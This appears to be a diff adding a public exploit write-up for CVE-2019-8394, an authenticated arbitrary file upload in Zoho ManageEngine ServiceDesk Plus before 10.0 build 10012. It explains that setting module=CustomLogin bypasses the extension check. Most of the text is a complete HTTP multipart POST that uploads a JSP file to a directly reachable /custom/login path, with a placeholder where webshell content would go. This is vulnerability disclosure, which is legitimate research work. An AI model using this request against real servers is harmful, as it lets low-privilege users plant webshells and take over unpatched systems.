@@ -1,0 +1,44 @@
+# Exploit Title: Zoho ManageEngine ServiceDesk Plus (SDP) before 10.0 build 10012 - arbitrary file upload
+# Date: 18-02-2019
+# Exploit Author: Dao Duy Hung (duyhungattt@gmail.com)
+# Vendor Homepage: https://www.manageengine.com/products/service-desk/
+# Software Link: https://www.manageengine.com/products/service-desk/download.html?opDownload_indexbnr
+# Version: 9.4 and 10.0 before 10.0 build 10012
+# Tested on: SDP 10.0 build 10000
+# CVE : CVE-2019-8394
+
+Detail:
+In file common/FileAttachment.jsp line 332 only check file upload extension when parameter 'module' equal to 'SSP' or 'DashBoard' or 'HomePage', and if parameter 'module' is set to 'CustomLogin' will skip check file upload extension function and upload arbitrary file to folder '/custom/login' and this file can access directly from url 'host:port/custom/login/filename' . An authenticated user with minimum permission (ex: guest) can upload webshell to server.
+
+POST /common/FileAttachment.jsp?module=CustomLogin&view=Dashboard1 HTTP/1.1
+Host: localhost:8080
+Content-Length: 508
+Accept: */*
+Origin: http://localhost:8080
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Content-Type: multipart/form-data; boundary=----aaa
+Referer: http://localhost:8080/DashBoard.do
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,vi;q=0.8
+Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; JSESSIONID=66716A38326AE43058F4A71FCF4E1E42; JSESSIONIDSSO=6970EB5659C20DFF0CF5015D9C91448E; sdpcsrfcookie=ec189770-d1aa-4db3-9a97-36f4ab3db380
+Connection: close
+
+------aaa
+Content-Disposition: form-data; name="sspsetup"
+
+Attach
+------aaa
+Content-Disposition: form-data; name="module"
+
+CustomLogin
+------aaa
+Content-Disposition: form-data; name="filePath"; filename="test.jsp"
+Content-Type: text/html
+
+This is shell content
+------aaa
+Content-Disposition: form-data; name="hmtlcontent"
+
+
+------aaa--
